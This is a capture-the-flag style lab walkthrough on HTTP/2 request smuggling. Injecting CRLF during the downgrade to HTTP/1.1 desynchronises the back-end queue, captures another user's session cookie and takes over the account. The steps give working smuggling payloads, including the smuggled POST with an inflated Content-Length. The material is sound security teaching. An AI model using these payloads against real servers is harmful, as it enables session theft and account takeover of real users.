# HTTP/2 Request Smuggling via CRLF Injection

## Description


This vulnerability occurs when the front-end server downgrades HTTP/2 requests to HTTP/1.1 but fails to properly 

sanitize header values. An attacker can inject **CRLF (`\r\n`)** into an HTTP/2 header, causing the back-end to 

interpret part of the header value as a new HTTP/1.1 header.

In this lab, the injected header is:


```http

Transfer-Encoding: chunked

```


This enables **HTTP Request Smuggling**, allowing us to poison the back-end request queue and capture another 

user's HTTP request.

---

# Why does this happen?


Normally HTTP/2 does **not** use:


```http

Transfer-Encoding: chunked

```


However, when the front-end converts HTTP/2 into HTTP/1.1, it should sanitize header values.


Because it doesn't, we can inject:


```text

Foo: bar\r\nTransfer-Encoding: chunked

```


The back-end receives:


```http

Foo: bar

Transfer-Encoding: chunked

```


instead of:


```http

Foo: bar\r\nTransfer-Encoding: chunked

```


This changes how the back-end parses the request.


---


# Exploitation Steps


## 1. Generate a POST request


Use the search function so Burp captures:


```http

POST / HTTP/2

```


Send it to **Repeater**.


---


## 2. Remove your session cookie


Delete your session cookie and resend the request.


This confirms that the recent searches are tied to your session.


---


## 3. Force HTTP/2


In Burp Inspector:


```

Request Attributes

```


Ensure the protocol is:


```

HTTP/2

```

---


## 4. Inject a new header


Add a custom header:

```

Name:

Foo

```


Value:


```

bar

Transfer-Encoding: chunked

```


**Important**


The new line between **bar** and **Transfer-Encoding** must be a **real CRLF**, not the text `\r\n`.


Burp will mark the request as:


```

kettled

```


This is expected.


---


## 5. Test for desynchronization


Body:


```http

0


SMUGGLED

```


Send the request several times.


If every second request returns:


```

404

```


the request queue has been successfully desynchronized.


---


## 6. Smuggle a POST request


Replace the body with:



```http

0


POST / HTTP/1.1

Host: LAB-ID.web-security-academy.net

Cookie: session=YOUR_SESSION_COOKIE

Content-Length: 800


search=x

```

---


## Why Content-Length is 800?


The body is intentionally incomplete.


The back-end keeps waiting for the remaining bytes.


The victim's next request supplies those missing bytes.


---


## 7. Wait for the victim


The victim visits the home page every **15 seconds**.



After sending the payload:


* Wait approximately **15 seconds**.

* Refresh the page.

---


## 8. Check Recent Searches


If successful, instead of seeing:

```

search=x

```


You'll see something like:


```http

GET / HTTP/1.1

Host: LAB-ID.web-security-academy.net

Cookie: session=xxxxxxxxxxxxxxxx

```


This is the victim's request.


Copy the session cookie.


---


## 9. Hijack the victim session


Send a normal request:


```http

GET /my-account HTTP/2

Host: LAB-ID.web-security-academy.net

Cookie: session=VICTIM_SESSION

```


or


```http

GET / HTTP/2

Host: LAB-ID.web-security-academy.net

Cookie: session=VICTIM_SESSION

```


If the cookie is correct, the lab is solved.



---


# Important Notes


* HTTP/2 normally doesn't use `Transfer-Encoding`.

* CRLF Injection is used to create a new HTTP/1.1 header during downgrade.

* The request becomes **kettled** after inserting a real CRLF.

* Do **not** reuse the smuggling request to test the stolen session.

* Create a **new clean request** and only replace the session cookie.

* If Recent Searches contains your own `POST` request, you refreshed too early.

* If it contains the victim's `GET` request, the attack succeeded.

---

# Attack Flow



```text

HTTP/2 Request

        │

        ▼

Inject CRLF

        │

        ▼

Create "Transfer-Encoding: chunked"

        │

        ▼

Front-end downgrades to HTTP/1.1

        │

        ▼

Back-end interprets request as chunked

        │

        ▼

Request Queue Desynchronization

        │

        ▼

Victim Request Appended

        │

        ▼

Victim Session Cookie Leaked

        │

        ▼

Reuse Cookie

        │

        ▼

Account Takeover

```

---

# Key Takeaways


* HTTP/2 can still be vulnerable to Request Smuggling after being downgraded to HTTP/1.1.

* CRLF Injection can introduce new HTTP headers during the downgrade process.

* Injecting `Transfer-Encoding: chunked` changes how the back-end parses the request.

* Desynchronizing the request queue allows part of the victim's request to be appended to the attacker-controlled 
request.

* Session cookies leaked from the victim's request can be reused to hijack their session.

---
